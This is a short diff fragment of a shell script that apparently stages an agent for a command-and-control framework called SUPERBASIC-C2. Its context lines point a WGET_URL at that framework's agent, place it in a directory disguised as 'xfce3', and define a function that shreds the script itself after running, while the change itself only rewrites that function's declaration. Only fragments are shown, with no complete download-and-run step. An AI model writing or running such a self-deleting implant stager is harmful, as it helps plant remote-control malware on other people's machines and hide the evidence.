@@ -7,7 +7,7 @@ WGET_URL="https://github.com/routpalm/SUPERBASIC-C2/tree/main/agents/defaultagen
 NEW_DIR="xfce3"
 FILE="defaultagent"
 SCRIPT_PATH="$0"
-function done {
+done() {
   echo "Shredding self..."; shred -u ${SCRIPT_PATH};
 }
 if [ ! -x "$wget" ]; then
